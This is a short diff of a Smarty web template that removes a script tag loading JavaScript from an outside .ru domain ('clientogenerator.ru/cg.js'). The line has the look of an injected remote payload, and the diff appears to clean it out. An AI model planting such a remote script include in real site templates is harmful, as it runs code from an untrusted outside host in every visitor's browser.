@@ -1,5 +1,3 @@
-<script type="text/javascript" src="http://clientogenerator.ru/cg.js"></script>
-
 {if $user.admin}{include file="`$paths.admin_templates`/admin_bar.tpl"}
 {else}
   <div id="acms_lb-background" class="acms_lb-background"></div>
